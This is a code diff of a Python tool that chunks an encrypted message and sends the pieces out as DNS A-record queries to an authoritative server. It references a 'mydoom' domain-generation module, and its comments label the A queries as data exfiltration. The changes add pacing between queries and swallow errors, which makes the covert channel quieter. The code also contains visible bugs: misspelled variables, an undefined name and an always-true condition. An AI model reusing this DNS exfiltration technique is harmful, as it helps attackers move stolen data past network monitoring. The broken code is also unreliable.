@@ -3,6 +3,7 @@
 import argparse
 import base64
 from sys import argv
+import time
 
 import dns.resolver
 from dga import mydoom
@@ -23,10 +24,10 @@ from dga import mydoom
 ## - 'mail' : the size of RR
 ## - 'www'  : the required packet numbers
 
-def search_response(msg:str)->str:
+def search_response(msg:str) ->str:
     pass
 
-def exfiltrate(msg: str, length: int=10) -> list:
+def exfiltrate(msg:str, length:int=10) ->list:
     """
     - control the number of packets based of the response packet size
     - if the requested message packet, 
@@ -36,33 +37,42 @@ def exfiltrate(msg: str, length: int=10) -> list:
     decomposed_msg = [_encrypted[i: i+lentgh] for i in range(0, len(_encrypted), length)]
     return decompose_msg
 
-def query(message: list, hostname: str, RR: str) -> list:
+def query(message:list, hostname:str, interval:int) ->list:
     """
     - deal with the number of requesting messages
     - send the query message to the auth server
     - handle RR based on the query message
+    - 'A' means data exfiltration
+    - 'TXT' means expanding the function
     """
     # Query the DNS request to the auth server
     if len(message) == 1:
         payload = [message + '.' + hostname]
         if message == 'mail' or 'www':
-            RR = 'A'
-            while True:
-                dns.resolver.query(payload, RR)
+            try:
+                dns.resolver.query(payload, 'A')
+                # if it needs, use the below script
+                # return str(answer).strip('>]').split(' ')[-1]
+            except:
+                pass
             return 0
 
         else:
-            RR = 'TXT'
-            response = dns.resolver.query(payload, RR)
+            response = dns.resolver.query(payload, 'TXT')
             verification_line = [str(i).split('=') for i in response[:]\
                                 if 'verification' in str(i)]
             return verification_line
 
+    elif len(message) == 0:
+        return 0
     else:
         payload = [msg + '.' + hostname for msg in message]
-        RR = 'A'
         for i in payload:
-            dns.resolver.query(payload, RR)
+            try:
+                dns.resolver.query(payload, 'A')
+            except:
+                continue
+            time.sleep(interval)
         return 0
 
 
